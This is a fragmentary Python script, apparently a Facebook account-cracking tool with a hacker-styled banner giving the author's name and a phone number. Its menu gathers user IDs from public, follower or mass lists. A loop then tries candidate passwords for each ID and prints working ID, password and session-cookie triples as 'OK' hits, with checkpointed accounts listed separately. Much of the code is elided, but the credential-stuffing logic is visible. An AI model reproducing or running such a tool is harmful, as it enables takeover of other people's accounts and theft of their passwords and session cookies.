...
# author by Arman Khosti (Arman Khan)
...
def logo():
	...
	print("""\x1b[0;32m╔════════════════════════════════════════════╗
jalan \x1b[0;33m║WELCOME TO MY TOOLS  [ Arman Khosti].  ║
jalan \x1b[0;33m║       #TOOL AUTHOR [Arman Khan]. ║
jalan \x1b[0;33m╚════════════════════════════════════════════╝
\x1b[0;33m ---------------------------------------------
\x1b[0;33m╔════════════════════════════════════════════╗
\x1b[0;33m║꧁☠ℜ𝔦𝔞𝔷☠️꧂ ᴴᴬᶜᴷᴱᴿ 𝙸𝚖 𝚗𝚘𝚝 𝚋𝚊𝚍 𝚒𝚖 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚍𝚊𝚍 ║
\x1b[0;33m║#FACEBOOK : NAME [Arman Khan  II ].       ║
\x1b[0;33m║#GITHUB : Arman Khan  ║
\x1b[0;33m║#WHATSAPP : +93783361438               ║
\x1b[0;33m╚════════════════════════════════════════════╝""")
...
def menu():
	...
	elif Bilal == "1" or NAIM == "01":

		publik()

		method()

	elif Bilal == "2" or NAIM == "02":

		follower()

		method()

	elif Bilal == "3" or  NAIM == "03":

		massal()

		method()

	elif AWAIS == "4" or NAIM == "04":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mRK PRO/FASTER \033[1;97m]")
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[HA-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[HA-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[HA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[HA-CP] %s|%s\033[0;91m        "%(uid, pw))
